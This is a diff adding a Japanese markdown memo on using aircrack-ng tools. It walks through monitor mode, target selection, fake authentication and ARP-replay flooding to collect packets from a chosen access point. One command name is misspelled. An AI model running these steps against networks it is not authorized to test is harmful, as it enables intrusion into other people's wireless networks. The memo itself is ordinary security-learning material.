@@ -1,0 +1,71 @@
+aircrack の使い方
+=================
+
+解析方法
+--------
+
+injection test を行い、ping レスポンスが返ってくるか確かめる。
+injection test が失敗する場合、aireplay-ng を利用することはできない
+
+    $ aireplay-ng -9 wlan0
+
+成功した場合、次のステップに進む。
+monitor mode でないとパケットの盗聴ができないので、
+インターフェイスカードを monitor mode へと移行させる。
+
+    $ airmon-ng start wlan0 9
+
+Driver の下に monitor mode enable と出力されれば成功。
+iwconfig で確認すると、新しく mon0 というインターフェイスが出現していることが確認できる。
+
+    $ iwconfig
+
+次は周囲のパケットを解析し、解析するターゲットを選定する。
+なお、この時は `-c` で 1 ~ 14 のチャネルを設定しないと、aireplay-ng による injection test に失敗する。
+そのため、テストまで含めて行う場合は必ず `-c` を付けること。
+
+    $ airodunmp-ng -c 11 mon0
+
+* `s`: 並び替え順を変更する
+* `i`: 昇順, 降順を変更する
+* `a`: 表示するデータテーブルを変更する
+
+airodump-ng を見ながらターゲットを選択後、
+Packet injection が行えるかどうかテストする。
+
+    $ aireplay-ng -9 -e ${ESSID} -a {BSSID} mon0
+
+* 0: Deauthentication
+* 1: Fake authentication
+* 2: Interactive packet replay
+* 3: ARP request replay attack
+* 4: KoreK chopchop attack
+* 5: Fragmentation attack
+* 6: Cafe-latte attack
+* 7: Client-oriented fragmentation attack
+* 8: WPA Migration Mode
+* 9: Injection test
+
+攻撃用のモニタリング開始
+
+    $ airodump-ng -c 11 --bssid ${BSSID} -w output mon0
+
+偽のMAC認証を AP に対して行う
+
+    $ aireplay-ng -1 0 -e ${ESSID} -a ${BSSID} mon0
+
+ARP リクエストモードに移行し、データを溢れさせる
+
+    $ aireplay-ng -3 -b ${BSSID} mon0
+
+データが 25,000 ~ 40,000 溜まったところでやめる
+
+全て終了した後は monitor mode を止める
+
+    $ airmon-ng stop mon0 9
+
+参考サイト
+----------
+
+* [tutorial](http://www.aircrack-ng.org/doku.php?id=tutorial)
+
